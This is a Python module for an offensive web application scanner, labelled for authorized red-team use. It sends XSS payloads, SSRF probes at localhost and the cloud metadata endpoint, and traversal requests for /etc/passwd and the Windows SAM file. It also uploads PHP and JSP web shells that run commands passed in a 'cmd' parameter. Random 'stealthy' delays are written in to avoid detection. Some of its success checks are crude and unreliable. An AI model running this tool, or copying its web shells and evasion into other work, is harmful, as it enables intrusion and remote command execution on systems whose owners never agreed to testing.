"""
Web Application Testing Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Web Application Testing module performs comprehensive web application security testing
including OWASP Top 10 vulnerabilities, XSS, CSRF, SSRF, and other web-specific attacks.
This module extends the basic exploit module with web-focused testing capabilities.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.web_app_testing import WebAppTesting
    
    # Initialize logger and module
    logger = FrameworkLogger("web_test")
    web_test = WebAppTesting(logger)
    
    # Test for XSS vulnerabilities
    xss_result = web_test.test_xss("http://target.com/search?q=test")
    print(f"XSS vulnerabilities: {len(xss_result['vulnerabilities'])}")
    
    # Test for CSRF vulnerabilities
    csrf_result = web_test.test_csrf("http://target.com/profile")
    print(f"CSRF vulnerable: {csrf_result['vulnerable']}")
    
    # Test for SSRF vulnerabilities
    ssrf_result = web_test.test_ssrf("http://target.com/api/fetch")
    print(f"SSRF vulnerable: {ssrf_result['vulnerable']}")
    
    # Full OWASP Top 10 scan
    owasp_scan = web_test.scan_owasp_top10("http://target.com")
    print(f"Vulnerabilities found: {owasp_scan['total_vulnerabilities']}")

Red Team Use Cases:
- XSS (Cross-Site Scripting) testing
- CSRF (Cross-Site Request Forgery) testing
- SSRF (Server-Side Request Forgery) testing
- OWASP Top 10 vulnerability scanning
- File upload vulnerabilities
- Directory traversal testing
- Authentication bypass testing
- Session management testing
"""

from typing import Dict, List, Optional
import time
import requests
import re
import urllib.parse
import random
from urllib.parse import urlparse, urljoin
from utils.logger import FrameworkLogger


class WebAppTesting:
    """Web application testing module"""
    
    def __init__(self, logger: FrameworkLogger):
        """
        Initialize web application testing module
        
        Args:
            logger: Logger instance
        """
        self.logger = logger
        self.vulnerabilities = []
        self.test_history = []
    
    def test_xss(self, url: str, payloads: Optional[List[str]] = None) -> Dict:
        """
        Test for XSS vulnerabilities
        
        Args:
            url: Target URL
            payloads: Custom XSS payloads (optional)
        
        Returns:
            Dictionary containing XSS test results
        """
        self.logger.info(f"Testing XSS on {url}")
        
        if payloads is None:
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>"
            ]
        
        results = {
            "url": url,
            "vulnerable": False,
            "vulnerabilities": [],
            "payloads_tested": len(payloads),
            "timestamp": time.time()
        }
        
        try:
            parsed = urlparse(url)
            params = {}
            
            # Extract parameters from URL
            if parsed.query:
                params = dict(urllib.parse.parse_qsl(parsed.query))
            
            # Test each payload in each parameter
            for param_name, param_value in params.items():
                for i, payload in enumerate(payloads):
                    # Stealthy delay between requests to avoid detection
                    if i > 0:
                        delay = random.uniform(0.5, 2.0)  # Random delay 0.5-2 seconds
                        time.sleep(delay)
                    
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    # Test GET request
                    try:
                        response = requests.get(url, params=test_params, timeout=5, verify=False)
                        
                        if payload in response.text:
                            results["vulnerable"] = True
                            results["vulnerabilities"].append({
                                "parameter": param_name,
                                "payload": payload,
                                "method": "GET",
                                "reflected": True
                            })
                            self.logger.warning(f"XSS vulnerability found in parameter {param_name}")
                    except Exception as e:
                        self.logger.debug(f"XSS test failed: {e}")
            
            # Test POST request
            if parsed.path:
                try:
                    for i, payload in enumerate(payloads):
                        # Stealthy delay between POST requests
                        if i > 0:
                            delay = random.uniform(0.5, 2.0)  # Random delay
                            time.sleep(delay)
                        
                        response = requests.post(url, data={"test": payload}, timeout=5, verify=False)
                        if payload in response.text:
                            results["vulnerable"] = True
                            results["vulnerabilities"].append({
                                "parameter": "POST data",
                                "payload": payload,
                                "method": "POST",
                                "reflected": True
                            })
                except Exception:
                    pass
                    
        except Exception as e:
            self.logger.error(f"XSS testing failed: {e}")
            results["error"] = str(e)
        
        self.test_history.append({"test_type": "xss", "results": results})
        return results
    
    def test_csrf(self, url: str, method: str = "POST") -> Dict:
        """
        Test for CSRF vulnerabilities
        
        Args:
            url: Target URL
            method: HTTP method to test
        
        Returns:
            Dictionary containing CSRF test results
        """
        self.logger.info(f"Testing CSRF on {url}")
        
        results = {
            "url": url,
            "vulnerable": False,
            "csrf_protection": None,
            "timestamp": time.time()
        }
        
        try:
            response = requests.get(url, timeout=5, verify=False)
            headers = response.headers
            
            # Check for CSRF tokens
            csrf_token_in_body = re.search(r'csrf[_-]?token|_token|csrf[_-]?key', response.text, re.I)
            csrf_token_in_header = 'X-CSRF-Token' in headers or 'CSRF-Token' in headers
            
            # Check for SameSite cookie attribute
            cookies = response.cookies
            same_site_secure = any(
                'SameSite' in str(cookie) and 'Secure' in str(cookie)
                for cookie in cookies
            )
            
            if not csrf_token_in_body and not csrf_token_in_header:
                if not same_site_secure:
                    results["vulnerable"] = True
                    results["csrf_protection"] = "none"
                else:
                    results["csrf_protection"] = "partial"
            else:
                results["csrf_protection"] = "present"
                
        except Exception as e:
            self.logger.error(f"CSRF testing failed: {e}")
            results["error"] = str(e)
        
        self.test_history.append({"test_type": "csrf", "results": results})
        return results
    
    def test_ssrf(self, url: str, test_urls: Optional[List[str]] = None) -> Dict:
        """
        Test for SSRF vulnerabilities
        
        Args:
            url: Target URL
            test_urls: URLs to test for SSRF (optional)
        
        Returns:
            Dictionary containing SSRF test results
        """
        self.logger.info(f"Testing SSRF on {url}")
        
        if test_urls is None:
            test_urls = [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254",  # AWS metadata
                "http://localhost:8080"
            ]
        
        results = {
            "url": url,
            "vulnerable": False,
            "accessible_urls": [],
            "timestamp": time.time()
        }
        
        try:
            parsed = urlparse(url)
            
            # Try to inject URLs into common parameters
            ssrf_params = ["url", "link", "path", "file", "page", "redirect", "uri"]
            
            for param in ssrf_params:
                for i, test_url in enumerate(test_urls):
                    # Stealthy delay between SSRF tests
                    if i > 0:
                        delay = random.uniform(0.5, 1.5)  # Random delay 0.5-1.5 seconds
                        time.sleep(delay)
                    
                    try:
                        test_params = {param: test_url}
                        response = requests.get(url, params=test_params, timeout=3, verify=False, allow_redirects=False)
                        
                        # Check if internal URL was accessed
                        if response.status_code in [200, 302, 301]:
                            if "127.0.0.1" in response.text or "localhost" in response.text:
                                results["vulnerable"] = True
                                results["accessible_urls"].append({
                                    "parameter": param,
                                    "url": test_url
                                })
                                self.logger.warning(f"SSRF vulnerability found in parameter {param}")
                    except Exception:
                        pass
                        
        except Exception as e:
            self.logger.error(f"SSRF testing failed: {e}")
            results["error"] = str(e)
        
        self.test_history.append({"test_type": "ssrf", "results": results})
        return results
    
    def test_directory_traversal(self, url: str) -> Dict:
        """
        Test for directory traversal vulnerabilities
        
        Args:
            url: Target URL
        
        Returns:
            Dictionary containing directory traversal test results
        """
        self.logger.info(f"Testing directory traversal on {url}")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        results = {
            "url": url,
            "vulnerable": False,
            "vulnerabilities": [],
            "timestamp": time.time()
        }
        
        try:
            parsed = urlparse(url)
            file_params = ["file", "path", "page", "include", "doc", "document"]
            
            for param in file_params:
                for i, payload in enumerate(payloads):
                    # Stealthy delay between directory traversal tests
                    if i > 0:
                        delay = random.uniform(0.5, 1.5)  # Random delay 0.5-1.5 seconds
                        time.sleep(delay)
                    
                    test_params = {param: payload}
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    try:
                        response = requests.get(test_url, params=test_params, timeout=5, verify=False)
                        
                        # Check for common file content indicators
                        if "root:" in response.text or "[boot loader]" in response.text:
                            results["vulnerable"] = True
                            results["vulnerabilities"].append({
                                "parameter": param,
                                "payload": payload,
                                "method": "GET"
                            })
                            self.logger.warning(f"Directory traversal vulnerability found in parameter {param}")
                    except Exception:
                        pass
                        
        except Exception as e:
            self.logger.error(f"Directory traversal testing failed: {e}")
            results["error"] = str(e)
        
        self.test_history.append({"test_type": "directory_traversal", "results": results})
        return results
    
    def test_file_upload(self, url: str, malicious_files: Optional[List[Dict]] = None) -> Dict:
        """
        Test for file upload vulnerabilities
        
        Args:
            url: Target URL
            malicious_files: Custom malicious files to upload (optional)
        
        Returns:
            Dictionary containing file upload test results
        """
        self.logger.info(f"Testing file upload on {url}")
        
        if malicious_files is None:
            malicious_files = [
                {"name": "test.php", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/x-php"},
                {"name": "test.jsp", "content": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "mime": "application/x-jsp"},
                {"name": "test.jspx", "content": "<jsp:directive.page import=\"java.lang.Runtime\"/>", "mime": "application/x-jsp"}
            ]
        
        results = {
            "url": url,
            "vulnerable": False,
            "uploaded_files": [],
            "timestamp": time.time()
        }
        
        for i, file_info in enumerate(malicious_files):
            # Stealthy delay between file upload attempts
            if i > 0:
                delay = random.uniform(1.0, 2.5)  # Random delay 1-2.5 seconds
                time.sleep(delay)
            
            try:
                files = {
                    "file": (file_info["name"], file_info["content"], file_info["mime"])
                }
                
                response = requests.post(url, files=files, timeout=5, verify=False)
                
                if response.status_code == 200:
                    # Check if file was uploaded
                    if file_info["name"] in response.text or "upload" in response.text.lower():
                        results["vulnerable"] = True
                        results["uploaded_files"].append({
                            "filename": file_info["name"],
                            "status": "uploaded"
                        })
                        self.logger.warning(f"File upload vulnerability: {file_info['name']} uploaded")
            except Exception as e:
                self.logger.debug(f"File upload test failed: {e}")
        
        self.test_history.append({"test_type": "file_upload", "results": results})
        return results
    
    def scan_owasp_top10(self, base_url: str) -> Dict:
        """
        Perform OWASP Top 10 vulnerability scan
        
        Args:
            base_url: Base URL to scan
        
        Returns:
            Dictionary containing OWASP Top 10 scan results
        """
        self.logger.info(f"Performing OWASP Top 10 scan on {base_url}")
        
        results = {
            "base_url": base_url,
            "vulnerabilities": {},
            "total_vulnerabilities": 0,
            "timestamp": time.time()
        }
        
        # A01:2021 – Broken Access Control
        # A02:2021 – Cryptographic Failures
        # A03:2021 – Injection (SQL, XSS, etc.)
        # A04:2021 – Insecure Design
        # A05:2021 – Security Misconfiguration
        # A06:2021 – Vulnerable and Outdated Components
        # A07:2021 – Identification and Authentication Failures
        # A08:2021 – Software and Data Integrity Failures
        # A09:2021 – Security Logging and Monitoring Failures
        # A10:2021 – Server-Side Request Forgery (SSRF)
        
        # Test injection (A03)
        xss_results = self.test_xss(base_url)
        if xss_results["vulnerable"]:
            results["vulnerabilities"]["A03_Injection"] = xss_results
        
        # Test SSRF (A10)
        ssrf_results = self.test_ssrf(base_url)
        if ssrf_results["vulnerable"]:
            results["vulnerabilities"]["A10_SSRF"] = ssrf_results
        
        # Test CSRF
        csrf_results = self.test_csrf(base_url)
        if csrf_results["vulnerable"]:
            results["vulnerabilities"]["A01_Broken_Access_Control"] = csrf_results
        
        # Test directory traversal
        traversal_results = self.test_directory_traversal(base_url)
        if traversal_results["vulnerable"]:
            results["vulnerabilities"]["A01_Broken_Access_Control"] = traversal_results
        
        # Test file upload
        upload_results = self.test_file_upload(base_url)
        if upload_results["vulnerable"]:
            results["vulnerabilities"]["A01_Broken_Access_Control"] = upload_results
        
        results["total_vulnerabilities"] = len(results["vulnerabilities"])
        
        self.test_history.append({"test_type": "owasp_top10", "results": results})
        return results
    
    def get_vulnerabilities(self) -> List[Dict]:
        """Get all discovered vulnerabilities"""
        return self.vulnerabilities
    
    def get_test_history(self) -> List[Dict]:
        """Get test history"""
        return self.test_history

